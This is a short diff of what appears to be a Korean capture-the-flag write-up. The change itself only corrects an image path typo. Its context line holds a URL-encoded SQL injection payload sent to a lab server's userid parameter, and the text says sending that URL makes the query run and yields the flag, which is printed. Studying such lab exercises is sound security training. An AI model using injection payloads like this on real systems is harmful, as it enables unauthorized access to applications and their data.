@@ -22,6 +22,6 @@ http://edu.arang.kr:9202/?userid=a%27=%27a%27%23%0aand%23%0auserid=concat(%27ad%
 
 이와 같이 url을 날려주면 위와 같이 sql이 동작하므로 flag를 획득 할 수 있다.
 
-![](imgaes/16.png)
+![](images/16.png)
 
 flag{b715e24914d597b86ce5}
